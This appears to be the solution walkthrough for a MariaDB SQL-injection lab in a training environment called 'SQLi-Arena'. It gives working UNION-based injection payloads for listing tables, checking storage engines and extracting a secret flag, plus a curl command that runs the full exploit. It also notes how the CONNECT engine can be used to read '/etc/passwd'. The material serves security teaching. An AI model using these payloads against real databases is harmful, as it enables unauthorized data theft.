<h4>Step 1: Test Normal Search</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>MariaDB<br>
        <span class="prompt">SQL: </span>SELECT id, name, price FROM products WHERE name LIKE '%MariaDB%'<br><br>
        <span class="prompt">Output:</span><br>
        <strong>ID:</strong> 1 | <strong>Product:</strong> MariaDB Enterprise License | <strong>Price:</strong> $4999.99
    </div>
</div>

<h4>Step 2: Confirm Injection</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>MariaDB Error:</strong> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1
    </div>
</div>

<h4>Step 3: Enumerate Tables</h4>
<p>
    Using a non-matching prefix to suppress normal results, the UNION-injected rows appear cleanly.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Table Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>XYZNOTEXIST' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=database() -- -<br><br>
        <span class="prompt">Output (UNION rows):</span><br>
        <strong>ID:</strong> products<br>
        <strong>ID:</strong> <strong>engine_secrets</strong>
    </div>
</div>

<h4>Step 4: Check Available Engines</h4>
<p>
    MariaDB's CONNECT engine enables reading external files and remote databases.
    Check if it's installed via <code>information_schema.engines</code>.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Engine Check</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>XYZNOTEXIST' UNION SELECT engine, support, NULL FROM information_schema.engines -- -<br><br>
        <span class="prompt">Output:</span><br>
        MEMORY / YES | CSV / YES | PERFORMANCE_SCHEMA / YES | Aria / YES | MyISAM / YES | MRG_MyISAM / YES | InnoDB / DEFAULT | <strong>SEQUENCE / YES</strong><br>
        <span class="prompt">// CONNECT engine not installed on this instance, but SEQUENCE is available (MariaDB-specific)</span>
    </div>
</div>

<h4>Step 5: Extract the Flag</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. UNION Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>XYZNOTEXIST' UNION SELECT secret_value, NULL, NULL FROM engine_secrets -- -<br><br>
        <span class="prompt">Output:</span><br>
        <strong>ID:</strong> <strong>FLAG{ma_c0nn3ct_3ng1n3_r34d}</strong>
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the secret value and paste it into the verification form:
    <code>FLAG{ma_c0nn3ct_3ng1n3_r34d}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mariadb/lab2" \<br> --data-urlencode "search=XYZNOTEXIST' UNION SELECT secret_value, NULL, NULL FROM engine_secrets -- -"<br><br>
        <span class="prompt">Result: </span>ID: <strong>FLAG{ma_c0nn3ct_3ng1n3_r34d}</strong>
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> The CONNECT storage engine is unique to MariaDB and can create
    tables backed by external data sources (CSV, ODBC, remote MySQL, XML, JSON). If an attacker
    gains <code>CREATE TABLE</code> privileges (via stacked queries or misconfigured permissions),
    they can read arbitrary files from the filesystem using
    <code>ENGINE=CONNECT TABLE_TYPE=DOS FILE_NAME='/etc/passwd'</code>. Even without CONNECT
    installed, enumerating <code>information_schema.engines</code> reveals what storage engines
    are available: including MariaDB-specific ones like SEQUENCE, Spider, and ColumnStore.
    Always restrict engine availability and user privileges.
</div>
